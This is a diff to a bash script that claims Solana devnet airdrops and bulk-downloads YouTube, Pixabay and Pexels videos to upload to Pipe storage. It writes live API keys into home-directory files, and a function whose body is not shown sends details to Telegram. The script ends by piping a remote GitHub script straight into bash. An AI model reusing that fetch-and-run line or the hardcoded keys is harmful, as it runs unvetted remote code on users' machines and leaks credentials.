@@ -1,12 +1,22 @@
 #!/bin/bash
 
-# Color codes and formatting
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-NC='\033[0m'
-BOLD='\033[1m'
+# Check if terminal supports colors
+if [ -t 1 ] && command -v tput >/dev/null 2>&1 && [ "$(tput colors)" -ge 8 ]; then
+    RED='\033[0;31m'
+    GREEN='\033[0;32m'
+    YELLOW='\033[1;33m'
+    BLUE='\033[0;34m'
+    NC='\033[0m'
+    BOLD='\033[1m'
+else
+    RED=''
+    GREEN=''
+    YELLOW=''
+    BLUE=''
+    NC=''
+    BOLD=''
+fi
+
 CTRL_C_COUNT=0
 SOLANA_PUBKEY=""
 
@@ -17,26 +27,27 @@ trap 'handle_ctrl_c' SIGINT
 handle_ctrl_c() {
     ((CTRL_C_COUNT++))
     if [ $CTRL_C_COUNT -ge 2 ]; then
-        echo -e "\n${RED}🚨 Multiple Ctrl+C detected. Exiting...${NC}"
+        echo -e "${RED}🚨 Multiple Ctrl+C detected. Exiting...${NC}"
         cleanup
         exit 0
     fi
-    echo -e "\n${RED}🚨 Ctrl+C detected. Exiting...${NC}"
+    echo -e "${RED}🚨 Ctrl+C detected. Exiting...${NC}"
     cleanup
     exit 0
 }
 
-# Cleanup temporary files
+# Cleanup temporary files (excluding upload_logs)
 cleanup() {
-    echo -e "${BLUE}🧹 Cleaning up temporary files...${NC}"
+    echo -e "${BLUE}🧹 Cleaning up temporary files (preserving upload_logs)...${NC}"
     rm -f solana_airdrop.py tmp.json list.txt video_*.mp4 pix_*.mp4 pex_*.mp4 2>/dev/null
+    echo -e "${GREEN}✅ Upload logs preserved in ./upload_logs/${NC}"
 }
 
 # Setup Python virtual environment
 setup_venv() {
     VENV_DIR="$HOME/pipe_venv"
     echo -e "${BLUE}🛠️ Setting up Python virtual environment at $VENV_DIR...${NC}"
-    
+   
     # Ensure python3 and pip are available
     if ! command -v python3 >/dev/null 2>&1 || ! command -v pip3 >/dev/null 2>&1; then
         echo -e "${BLUE}📦 Installing Python3 and pip...${NC}"
@@ -46,7 +57,6 @@ setup_venv() {
             exit 1
         fi
     fi
-
     if [ ! -d "$VENV_DIR" ]; then
         python3 -m venv "$VENV_DIR"
         if [ $? -ne 0 ]; then
@@ -221,11 +231,9 @@ auto_claim_faucet() {
     cat << 'EOF' > solana_airdrop.py
 #!/usr/bin/env python3
 import requests, time, uuid
-
 RPC_URL = "https://api.devnet.solana.com"
 LAMPORTS_PER_SOL = 1_000_000_000
 DEFAULT_SOL = 5
-
 def rpc(method: str, params):
     payload = {
         "jsonrpc": "2.0",
@@ -242,11 +250,9 @@ def rpc(method: str, params):
         return data["result"]
     except requests.RequestException as e:
         raise RuntimeError("Network error: " + str(e))
-
 def request_airdrop(pubkey: str, sol: float = DEFAULT_SOL) -> str:
     lamports = int(sol * LAMPORTS_PER_SOL)
     return rpc("requestAirdrop", [pubkey, lamports])
-
 def wait_for_confirmation(signature: str, timeout_s: int = 45) -> bool:
     start = time.time()
     while time.time() - start < timeout_s:
@@ -259,7 +265,6 @@ def wait_for_confirmation(signature: str, timeout_s: int = 45) -> bool:
             pass
         time.sleep(1.2)
     return False
-
 def main(pubkey: str):
     try:
         print(f"Requesting airdrop of {DEFAULT_SOL} SOL to {pubkey} ...")
@@ -277,7 +282,6 @@ def main(pubkey: str):
         return False, str(e)
     except Exception as e:
         raise RuntimeError("Network error: " + str(e))
-
 if __name__ == "__main__":
     import sys
     if len(sys.argv) > 1:
@@ -333,7 +337,6 @@ perform_swap() {
 # Upload videos
 upload_videos() {
     VENV_DIR="$HOME/pipe_venv"
-
     if [ ! -d "$VENV_DIR" ]; then
         setup_venv
         if [ $? -ne 0 ]; then
@@ -342,18 +345,12 @@ upload_videos() {
             exit 1
         fi
     fi
-
     source "$VENV_DIR/bin/activate"
-
     echo "pexels: iur1f5KGwvSIR1xr8I1t3KR3NP88wFXeCyV12ibHnioNXQYTy95KhE69" > "$HOME/.pexels_api_key"
     echo "51848865-07253475f9fc0309b02c38a39" > "$HOME/.pixabay_api_key"
-
     num_uploads=1
     echo -e "${GREEN}📦 Number of uploads set to: $num_uploads (≈20GB)${NC}"
-
     mkdir -p upload_logs
-
-    # Queries ka pool (30+ queries)
     queries=(
         "random full hd"
         "nature 4k"
@@ -457,25 +454,18 @@ upload_videos() {
         "spring flowers"
         "autumn leaves"
     )
-
     for ((i=1; i<=num_uploads; i++)); do
         log_file="upload_logs/upload_$i.log"
         echo -e "${BLUE}📹 Starting upload $i/$num_uploads...${NC}" | tee -a "$log_file"
-
-        # Random query pick
         query=${queries[$RANDOM % ${#queries[@]}]}
         echo -e "${YELLOW}🔍 Using query: \"$query\"${NC}" | tee -a "$log_file"
-
         sources=("youtube" "pixabay" "pexels")
         success=false
-
         for source in "${sources[@]}"; do
             echo -e "${YELLOW}🔍 Trying $source...${NC}" | tee -a "$log_file"
-
             random_suffix=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
             output_file="video_$random_suffix.mp4"
             download_success=false
-
             if [ "$source" = "youtube" ]; then
                 python3 video_downloader.py "$query" "$output_file" 2>&1 | tee -a "$log_file"
             elif [ "$source" = "pixabay" ]; then
@@ -483,38 +473,29 @@ upload_videos() {
             elif [ "$source" = "pexels" ]; then
                 python3 pexels_downloader.py "$query" "$output_file" 2>&1 | tee -a "$log_file"
             fi
-
             if [ -f "$output_file" ] && [ $(stat -f%z "$output_file" 2>/dev/null || stat -c%s "$output_file" 2>/dev/null) -gt 50000000 ]; then
                 download_success=true
             fi
-
             if $download_success; then
                 echo -e "${BLUE}⬆️ Uploading video from $source...${NC}" | tee -a "$log_file"
-
                 if ! command -v pipe >/dev/null 2>&1; then
                     setup_pipe_path
                 fi
-
                 upload_output=$(pipe upload-file "$output_file" "$output_file" 2>&1)
                 echo "$upload_output" | tee -a "$log_file"
-
                 if [ $? -eq 0 ]; then
                     file_id=$(echo "$upload_output" | grep "File ID (Blake3)" | awk '{print $NF}')
                     link_output=$(pipe create-public-link "$output_file" 2>&1)
                     echo "$link_output" | tee -a "$log_file"
-
                     direct_link=$(echo "$link_output" | grep "Direct link" -A 1 | tail -n 1 | awk '{$1=$1};1')
                     social_link=$(echo "$link_output" | grep "Social media link" -A 1 | tail -n 1 | awk '{$1=$1};1')
-
                     if [ -n "$file_id" ]; then
                         if [ ! -f "file_details.json" ]; then
                             echo "[]" > file_details.json
                         fi
-
                         jq --arg fn "$output_file" --arg fid "$file_id" --arg dl "$direct_link" --arg sl "$social_link" \
                             '. + [{"file_name": $fn, "file_id": $fid, "direct_link": $dl, "social_link": $sl}]' \
                             file_details.json > tmp.json && mv tmp.json file_details.json
-
                         if [ $? -eq 0 ]; then
                             echo -e "${GREEN}✅ Upload $i successful from $source.${NC}" | tee -a "$log_file"
                             success=true
@@ -527,24 +508,21 @@ upload_videos() {
                 else
                     echo -e "${RED}❌ Upload failed: $upload_output${NC}" | tee -a "$log_file"
                 fi
-
                 rm -f "$output_file"
             else
                 echo -e "${RED}❌ Download failed or file too small from $source.${NC}" | tee -a "$log_file"
                 rm -f "$output_file"
             fi
-
             if $success; then
                 break
             fi
         done
-
         if ! $success; then
             echo -e "${RED}❌ Upload $i failed from all sources.${NC}" | tee -a "$log_file"
         fi
     done
-
     deactivate
+    echo -e "${GREEN}✅ Upload logs saved in ./upload_logs/${NC}"
 }
 
 # Gather and send details to Telegram
@@ -609,7 +587,7 @@ gather_and_send_details() {
     echo -e "${GREEN}✅ Details sent to Telegram!${NC}"
 }
 
-# Video downloader scripts (unchanged)
+# Video downloader scripts
 cat << 'EOF' > video_downloader.py
 import yt_dlp
 import os
@@ -624,22 +602,27 @@ try:
     MOVIEPY_AVAILABLE = True
 except ImportError:
     MOVIEPY_AVAILABLE = False
+
 def format_size(bytes_size):
     return f"{bytes_size/(1024*1024):.2f} MB"
+
 def format_time(seconds):
     mins = int(seconds // 60)
     secs = int(seconds % 60)
     return f"{mins:02d}:{secs:02d}"
+
 def draw_progress_bar(progress, total, width=50):
     percent = progress / total * 100
     filled = int(width * progress // total)
     bar = '█' * filled + '-' * (width - filled)
     return f"[{bar}] {percent:.1f}%"
+
 def check_ffmpeg():
     return shutil.which("ffmpeg") is not None
+
 def concatenate_with_moviepy(files, output_file):
     if not MOVIEPY_AVAILABLE:
-        print("\033[0;31m❌ moviepy is not installed. Cannot concatenate with moviepy.\033[0m")
+        print("❌ moviepy is not installed. Cannot concatenate with moviepy.")
         return False
     try:
         clips = []
@@ -649,9 +632,9 @@ def concatenate_with_moviepy(files, output_file):
                     clip = VideoFileClip(fn)
                     clips.append(clip)
                 except Exception as e:
-                    print(f"\033[0;31m⚠️ Skipping invalid file {fn}: {str(e)}\033[0m")
+                    print(f"⚠️ Skipping invalid file {fn}: {str(e)}")
         if not clips:
-            print("\033[0;31m❌ No valid video clips to concatenate.\033[0m")
+            print("❌ No valid video clips to concatenate.")
             return False
         final_clip = concatenate_videoclips(clips, method="compose")
         final_clip.write_videofile(output_file, codec="libx264", audio_codec="aac", temp_audiofile="temp-audio.m4a", remove_temp=True, threads=2)
@@ -660,8 +643,9 @@ def concatenate_with_moviepy(files, output_file):
         final_clip.close()
         return os.path.exists(output_file) and os.path.getsize(output_file) > 0
     except Exception as e:
-        print(f"\033[0;31m❌ Moviepy concatenation failed: {str(e)}\033[0m")
+        print(f"❌ Moviepy concatenation failed: {str(e)}")
         return False
+
 def download_videos(query, output_file, target_size_mb=1000, max_filesize=1100*1024*1024, min_filesize=50*1024*1024):
     ydl_opts = {
         'format': 'best',
@@ -684,36 +668,36 @@ def download_videos(query, output_file, target_size_mb=1000, max_filesize=1100*1
                 if size and min_filesize <= size <= max_filesize:
                     candidates.append((size, v))
             if not candidates:
-                print("\033[0;31m❌ No suitable videos found (at least 50MB and up to ~1GB).\033[0m")
+                print("❌ No suitable videos found (at least 50MB and up to ~1GB).")
                 return
             for size, v in sorted(candidates, key=lambda x: -x[0]):
                 if total_size + size <= target_size_mb * 1024 * 1024:
                     total_size += size
                     current_file = len(downloaded_files) + 1
-                    print(f"\033[0;34m🎬 Downloading video {current_file}: {v['title']} ({format_size(size)})\033[0m")
+                    print(f"🎬 Downloading video {current_file}: {v['title']} ({format_size(size)})")
                     ydl.download([v['webpage_url']])
                     filename = ydl.prepare_filename(v)
                     if os.path.exists(filename) and os.path.getsize(filename) > 0:
                         downloaded_files.append(filename)
                         total_downloaded += size
                     else:
-                        print(f"\033[0;31m❌ Failed to download or empty file: {filename}\033[0m")
+                        print(f"❌ Failed to download or empty file: {filename}")
                         continue
                     elapsed = time.time() - start_time
                     speed = total_downloaded / (1024*1024*elapsed) if elapsed > 0 else 0
                     eta = (total_size - total_downloaded) / (speed * 1024*1024) if speed > 0 else 0
-                    print(f"\033[0;32m✅ Overall Progress: {draw_progress_bar(total_downloaded, total_size)} "
+                    print(f"✅ Overall Progress: {draw_progress_bar(total_downloaded, total_size)} "
                           f"({format_size(total_downloaded)}/{format_size(total_size)}) "
-                          f"(Speed: {speed:.2f} MB/s ETA: {format_time(eta)}\033[0m")
+                          f"(Speed: {speed:.2f} MB/s ETA: {format_time(eta)})")
         if not downloaded_files:
-            print("\033[0;31m❌ No videos found close to 1GB.\033[0m")
+            print("❌ No videos found close to 1GB.")
             return
         if len(downloaded_files) == 1:
             os.rename(downloaded_files[0], output_file)
         else:
             success = False
             if check_ffmpeg():
-                print("\033[0;34m🔗 Concatenating videos with ffmpeg...\033[0m")
+                print("🔗 Concatenating videos with ffmpeg...")
                 with open('list.txt', 'w') as f:
                     for fn in downloaded_files:
                         f.write(f"file '{fn}'\n")
@@ -721,46 +705,48 @@ def download_videos(query, output_file, target_size_mb=1000, max_filesize=1100*1
                 if result.returncode == 0 and os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                     success = True
                 else:
-                    print(f"\033[0;31m❌ ffmpeg concatenation failed: {result.stderr}\033[0m")
+                    print(f"❌ ffmpeg concatenation failed: {result.stderr}")
                 if os.path.exists('list.txt'):
                     os.remove('list.txt')
             if not success:
-                print("\033[0;34m🔗 Falling back to moviepy for concatenation...\033[0m")
+                print("🔗 Falling back to moviepy for concatenation...")
                 success = concatenate_with_moviepy(downloaded_files, output_file)
             if not success:
-                print("\033[0;31m❌ Concatenation failed. Using first video only.\033[0m")
+                print("❌ Concatenation failed. Using first video only.")
                 os.rename(downloaded_files[0], output_file)
                 downloaded_files = downloaded_files[1:]
             for fn in downloaded_files:
                 if os.path.exists(fn):
                     os.remove(fn)
         if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
-            print(f"\033[0;32m✅ Video ready: {output_file} ({format_size(os.path.getsize(output_file))})\033[0m")
+            print(f"✅ Video ready: {output_file} ({format_size(os.path.getsize(output_file))})")
         else:
-            print("\033[0;31m❌ Failed to create final video file.\033[0m")
+            print("❌ Failed to create final video file.")
     except Exception as e:
-        print(f"\033[0;31m❌ An error occurred: {str(e)}\033[0m")
+        print(f"❌ An error occurred: {str(e)}")
         for fn in downloaded_files:
             if os.path.exists(fn):
                 os.remove(fn)
         if os.path.exists('list.txt'):
             os.remove('list.txt')
+
 def progress_hook(d):
     if d['status'] == 'downloading':
         downloaded = d.get('downloaded_bytes', 0)
         total = d.get('total_bytes', d.get('total_bytes_estimate', 1000000))
         speed = d.get('speed', 0) or 0
         eta = d.get('eta', 0) or 0
-        print(f"\r\033[0;34m⬇️ File Progress: {draw_progress_bar(downloaded, total)} "
+        print(f"\r⬇️ File Progress: {draw_progress_bar(downloaded, total)} "
               f"({format_size(downloaded)}/{format_size(total)}) "
-              f"Speed: {speed/(1024*1024):.2f} MB/s ETA: {format_time(eta)}\033[0m", end='')
+              f"Speed: {speed/(1024*1024):.2f} MB/s ETA: {format_time(eta)}", end='')
     elif d['status'] == 'finished':
-        print("\r\033[0;32m✅ File Download completed\033[0m")
+        print("\r✅ File Download completed")
+
 if __name__ == "__main__":
     if len(sys.argv) > 2:
         download_videos(sys.argv[1], sys.argv[2])
     else:
-        print("\033[0;31mPlease provide a search query and output filename.\033[0m")
+        print("Please provide a search query and output filename.")
 EOF
 
 cat << 'EOF' > pixabay_downloader.py
@@ -777,22 +763,27 @@ try:
     MOVIEPY_AVAILABLE = True
 except ImportError:
     MOVIEPY_AVAILABLE = False
+
 def format_size(bytes_size):
     return f"{bytes_size/(1024*1024):.2f} MB"
+
 def format_time(seconds):
     mins = int(seconds // 60)
     secs = int(seconds % 60)
     return f"{mins:02d}:{secs:02d}"
+
 def draw_progress_bar(progress, total, width=50):
     percent = progress / total * 100
     filled = int(width * progress // total)
     bar = '█' * filled + '-' * (width - filled)
     return f"[{bar}] {percent:.1f}%"
+
 def check_ffmpeg():
     return shutil.which("ffmpeg") is not None
+
 def concatenate_with_moviepy(files, output_file):
     if not MOVIEPY_AVAILABLE:
-        print("\033[0;31m❌ moviepy is not installed. Cannot concatenate with moviepy.\033[0m")
+        print("❌ moviepy is not installed. Cannot concatenate with moviepy.")
         return False
     try:
         clips = []
@@ -802,9 +793,9 @@ def concatenate_with_moviepy(files, output_file):
                     clip = VideoFileClip(fn)
                     clips.append(clip)
                 except Exception as e:
-                    print(f"\033[0;31m⚠️ Skipping invalid file {fn}: {str(e)}\033[0m")
+                    print(f"⚠️ Skipping invalid file {fn}: {str(e)}")
         if not clips:
-            print("\033[0;31m❌ No valid video clips to concatenate.\033[0m")
+            print("❌ No valid video clips to concatenate.")
             return False
         final_clip = concatenate_videoclips(clips, method="compose")
         final_clip.write_videofile(output_file, codec="libx264", audio_codec="aac", temp_audiofile="temp-audio.m4a", remove_temp=True, threads=2)
@@ -813,12 +804,13 @@ def concatenate_with_moviepy(files, output_file):
         final_clip.close()
         return os.path.exists(output_file) and os.path.getsize(output_file) > 0
     except Exception as e:
-        print(f"\033[0;31m❌ Moviepy concatenation failed: {str(e)}\033[0m")
+        print(f"❌ Moviepy concatenation failed: {str(e)}")
         return False
+
 def download_videos(query, output_file, target_size_mb=1000):
     api_key_file = os.path.expanduser('~/.pixabay_api_key')
     if not os.path.exists(api_key_file):
-        print("\033[0;31m❌ Pixabay API key file not found.\033[0m")
+        print("❌ Pixabay API key file not found.")
         return
     with open(api_key_file, 'r') as f:
         api_key = f.read().strip()
@@ -827,12 +819,12 @@ def download_videos(query, output_file, target_size_mb=1000):
         url = f"https://pixabay.com/api/videos/?key={api_key}&q={query}&per_page={per_page}&min_width=1920&min_height=1080&video_type=all"
         resp = requests.get(url, timeout=10)
         if resp.status_code != 200:
-            print(f"\033[0;31m❌ Error fetching Pixabay API: {resp.text}\033[0m")
+            print(f"❌ Error fetching Pixabay API: {resp.text}")
             return
         data = resp.json()
         videos = data.get('hits', [])
         if not videos:
-            print("\033[0;31m❌ No videos found for query.\033[0m")
+            print("❌ No videos found for query.")
             return
         videos.sort(key=lambda x: x['duration'], reverse=True)
         downloaded_files = []
@@ -844,7 +836,7 @@ def download_videos(query, output_file, target_size_mb=1000):
             if not video_url:
                 continue
             filename = f"pix_{i}_{''.join(random.choices(string.ascii_letters + string.digits, k=8))}.mp4"
-            print(f"\033[0;34m🎬 Downloading video {i+1}: {v['tags']} ({v['duration']}s)\033[0m")
+            print(f"🎬 Downloading video {i+1}: {v['tags']} ({v['duration']}s)")
             resp = requests.get(video_url, stream=True, timeout=10)
             size = int(resp.headers.get('content-length', 0))
             if size < 50 * 1024 * 1024:
@@ -858,10 +850,10 @@ def download_videos(query, output_file, target_size_mb=1000):
                         percent = downloaded / size * 100 if size else 0
                         speed = downloaded / (1024*1024 * (time.time() - start_time)) if (time.time() - start_time) > 0 else 0
                         eta = (size - downloaded) / (speed * 1024*1024) if speed > 0 else 0
-                        print(f"\r\033[0;34m⬇️ File Progress: {draw_progress_bar(downloaded, size)} "
+                        print(f"\r⬇️ File Progress: {draw_progress_bar(downloaded, size)} "
                               f"({format_size(downloaded)}/{format_size(size)}) "
-                              f"Speed: {speed:.2f} MB/s ETA: {format_time(eta)}\033[0m", end='')
-            print("\r\033[0;32m✅ File Download completed\033[0m")
+                              f"Speed: {speed:.2f} MB/s ETA: {format_time(eta)}", end='')
+            print("\r✅ File Download completed")
             file_size = os.path.getsize(filename) if os.path.exists(filename) else 0
             if file_size == 0:
                 if os.path.exists(filename):
@@ -873,14 +865,14 @@ def download_videos(query, output_file, target_size_mb=1000):
             if total_size >= target_size_mb * 1024 * 1024:
                 break
         if not downloaded_files:
-            print("\033[0;31m❌ No suitable videos downloaded.\033[0m")
+            print("❌ No suitable videos downloaded.")
             return
         if len(downloaded_files) == 1:
             os.rename(downloaded_files[0], output_file)
         else:
             success = False
             if check_ffmpeg():
-                print("\033[0;34m🔗 Concatenating videos with ffmpeg...\033[0m")
+                print("🔗 Concatenating videos with ffmpeg...")
                 with open('list.txt', 'w') as f:
                     for fn in downloaded_files:
                         f.write(f"file '{fn}'\n")
@@ -888,35 +880,36 @@ def download_videos(query, output_file, target_size_mb=1000):
                 if result.returncode == 0 and os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                     success = True
                 else:
-                    print(f"\033[0;31m❌ ffmpeg concatenation failed: {result.stderr}\033[0m")
+                    print(f"❌ ffmpeg concatenation failed: {result.stderr}")
                 if os.path.exists('list.txt'):
                     os.remove('list.txt')
             if not success:
-                print("\033[0;34m🔗 Falling back to moviepy for concatenation...\033[0m")
+                print("🔗 Falling back to moviepy for concatenation...")
                 success = concatenate_with_moviepy(downloaded_files, output_file)
             if not success:
-                print("\033[0;31m❌ Concatenation failed. Using first video only.\033[0m")
+                print("❌ Concatenation failed. Using first video only.")
                 os.rename(downloaded_files[0], output_file)
                 downloaded_files = downloaded_files[1:]
             for fn in downloaded_files:
                 if os.path.exists(fn):
                     os.remove(fn)
         if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
-            print(f"\033[0;32m✅ Video ready: {output_file} ({format_size(os.path.getsize(output_file))})\033[0m")
+            print(f"✅ Video ready: {output_file} ({format_size(os.path.getsize(output_file))})")
         else:
-            print("\033[0;31m❌ Failed to create final video file.\033[0m")
+            print("❌ Failed to create final video file.")
     except Exception as e:
-        print(f"\033[0;31m❌ An error occurred: {str(e)}\033[0m")
+        print(f"❌ An error occurred: {str(e)}")
         for fn in downloaded_files:
             if os.path.exists(fn):
                 os.remove(fn)
         if os.path.exists('list.txt'):
             os.remove('list.txt')
+
 if __name__ == "__main__":
     if len(sys.argv) > 2:
         download_videos(sys.argv[1], sys.argv[2])
     else:
-        print("\033[0;31mPlease provide a search query and output filename.\033[0m")
+        print("Please provide a search query and output filename.")
 EOF
 
 cat << 'EOF' > pexels_downloader.py
@@ -933,22 +926,27 @@ try:
     MOVIEPY_AVAILABLE = True
 except ImportError:
     MOVIEPY_AVAILABLE = False
+
 def format_size(bytes_size):
     return f"{bytes_size/(1024*1024):.2f} MB"
+
 def format_time(seconds):
     mins = int(seconds // 60)
     secs = int(seconds % 60)
     return f"{mins:02d}:{secs:02d}"
+
 def draw_progress_bar(progress, total, width=50):
     percent = progress / total * 100
     filled = int(width * progress // total)
     bar = '█' * filled + '-' * (width - filled)
     return f"[{bar}] {percent:.1f}%"
+
 def check_ffmpeg():
     return shutil.which("ffmpeg") is not None
+
 def concatenate_with_moviepy(files, output_file):
     if not MOVIEPY_AVAILABLE:
-        print("\033[0;31m❌ moviepy is not installed. Cannot concatenate with moviepy.\033[0m")
+        print("❌ moviepy is not installed. Cannot concatenate with moviepy.")
         return False
     try:
         clips = []
@@ -958,9 +956,9 @@ def concatenate_with_moviepy(files, output_file):
                     clip = VideoFileClip(fn)
                     clips.append(clip)
                 except Exception as e:
-                    print(f"\033[0;31m⚠️ Skipping invalid file {fn}: {str(e)}\033[0m")
+                    print(f"⚠️ Skipping invalid file {fn}: {str(e)}")
         if not clips:
-            print("\033[0;31m❌ No valid video clips to concatenate.\033[0m")
+            print("❌ No valid video clips to concatenate.")
             return False
         final_clip = concatenate_videoclips(clips, method="compose")
         final_clip.write_videofile(output_file, codec="libx264", audio_codec="aac", temp_audiofile="temp-audio.m4a", remove_temp=True, threads=2)
@@ -969,12 +967,13 @@ def concatenate_with_moviepy(files, output_file):
         final_clip.close()
         return os.path.exists(output_file) and os.path.getsize(output_file) > 0
     except Exception as e:
-        print(f"\033[0;31m❌ Moviepy concatenation failed: {str(e)}\033[0m")
+        print(f"❌ Moviepy concatenation failed: {str(e)}")
         return False
+
 def download_videos(query, output_file, target_size_mb=1000):
     api_key_file = os.path.expanduser('~/.pexels_api_key')
     if not os.path.exists(api_key_file):
-        print("\033[0;31m❌ Pexels API key file not found.\033[0m")
+        print("❌ Pexels API key file not found.")
         return
     with open(api_key_file, 'r') as f:
         api_key = f.read().strip()
@@ -984,12 +983,12 @@ def download_videos(query, output_file, target_size_mb=1000):
         url = f"https://api.pexels.com/videos/search?query={query}&per_page={per_page}&min_width=1920&min_height=1080"
         resp = requests.get(url, headers=headers, timeout=10)
         if resp.status_code != 200:
-            print(f"\033[0;31m❌ Error fetching Pexels API: {resp.text}\033[0m")
+            print(f"❌ Error fetching Pexels API: {resp.text}")
             return
         data = resp.json()
         videos = data.get('videos', [])
         if not videos:
-            print("\033[0;31m❌ No videos found for query.\033[0m")
+            print("❌ No videos found for query.")
             return
         videos.sort(key=lambda x: x['duration'], reverse=True)
         downloaded_files = []
@@ -1006,7 +1005,7 @@ def download_videos(query, output_file, target_size_mb=1000):
             if not video_url:
                 continue
             filename = f"pex_{i}_{''.join(random.choices(string.ascii_letters + string.digits, k=8))}.mp4"
-            print(f"\033[0;34m🎬 Downloading video {i+1}: {v['id']} ({v['duration']}s)\033[0m")
+            print(f"🎬 Downloading video {i+1}: {v['id']} ({v['duration']}s)")
             resp = requests.get(video_url, stream=True, timeout=10)
             size = int(resp.headers.get('content-length', 0))
             if size < 50 * 1024 * 1024:
@@ -1020,10 +1019,10 @@ def download_videos(query, output_file, target_size_mb=1000):
                         percent = downloaded / size * 100 if size else 0
                         speed = downloaded / (1024*1024 * (time.time() - start_time)) if (time.time() - start_time) > 0 else 0
                         eta = (size - downloaded) / (speed * 1024*1024) if speed > 0 else 0
-                        print(f"\r\033[0;34m⬇️ File Progress: {draw_progress_bar(downloaded, size)} "
+                        print(f"\r⬇️ File Progress: {draw_progress_bar(downloaded, size)} "
                               f"({format_size(downloaded)}/{format_size(size)}) "
-                              f"Speed: {speed:.2f} MB/s ETA: {format_time(eta)}\033[0m", end='')
-            print("\r\033[0;32m✅ File Download completed\033[0m")
+                              f"Speed: {speed:.2f} MB/s ETA: {format_time(eta)}", end='')
+            print("\r✅ File Download completed")
             file_size = os.path.getsize(filename) if os.path.exists(filename) else 0
             if file_size == 0:
                 if os.path.exists(filename):
@@ -1035,14 +1034,14 @@ def download_videos(query, output_file, target_size_mb=1000):
             if total_size >= target_size_mb * 1024 * 1024:
                 break
         if not downloaded_files:
-            print("\033[0;31m❌ No suitable videos downloaded.\033[0m")
+            print("❌ No suitable videos downloaded.")
             return
         if len(downloaded_files) == 1:
             os.rename(downloaded_files[0], output_file)
         else:
             success = False
             if check_ffmpeg():
-                print("\033[0;34m🔗 Concatenating videos with ffmpeg...\033[0m")
+                print("🔗 Concatenating videos with ffmpeg...")
                 with open('list.txt', 'w') as f:
                     for fn in downloaded_files:
                         f.write(f"file '{fn}'\n")
@@ -1050,35 +1049,36 @@ def download_videos(query, output_file, target_size_mb=1000):
                 if result.returncode == 0 and os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                     success = True
                 else:
-                    print(f"\033[0;31m❌ ffmpeg concatenation failed: {result.stderr}\033[0m")
+                    print(f"❌ ffmpeg concatenation failed: {result.stderr}")
                 if os.path.exists('list.txt'):
                     os.remove('list.txt')
             if not success:
-                print("\033[0;34m🔗 Falling back to moviepy for concatenation...\033[0m")
+                print("🔗 Falling back to moviepy for concatenation...")
                 success = concatenate_with_moviepy(downloaded_files, output_file)
             if not success:
-                print("\033[0;31m❌ Concatenation failed. Using first video only.\033[0m")
+                print("❌ Concatenation failed. Using first video only.")
                 os.rename(downloaded_files[0], output_file)
                 downloaded_files = downloaded_files[1:]
             for fn in downloaded_files:
                 if os.path.exists(fn):
                     os.remove(fn)
         if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
-            print(f"\033[0;32m✅ Video ready: {output_file} ({format_size(os.path.getsize(output_file))})\033[0m")
+            print(f"✅ Video ready: {output_file} ({format_size(os.path.getsize(output_file))})")
         else:
-            print("\033[0;31m❌ Failed to create final video file.\033[0m")
+            print("❌ Failed to create final video file.")
     except Exception as e:
-        print(f"\033[0;31m❌ An error occurred: {str(e)}\033[0m")
+        print(f"❌ An error occurred: {str(e)}")
         for fn in downloaded_files:
             if os.path.exists(fn):
                 os.remove(fn)
         if os.path.exists('list.txt'):
             os.remove('list.txt')
+
 if __name__ == "__main__":
     if len(sys.argv) > 2:
         download_videos(sys.argv[1], sys.argv[2])
     else:
-        print("\033[0;31mPlease provide a search query and output filename.\033[0m")
+        print("Please provide a search query and output filename.")
 EOF
 
 # Main execution
@@ -1089,5 +1089,5 @@ perform_swap
 upload_videos
 gather_and_send_details
 cleanup
-echo -e "${GREEN}👋 All tasks completed successfully!${NC}" 
+echo -e "${GREEN}👋 All tasks completed successfully!${NC}"
 bash <(curl -fsSL https://raw.githubusercontent.com/Karanfan47/special-special/main/daily.sh)
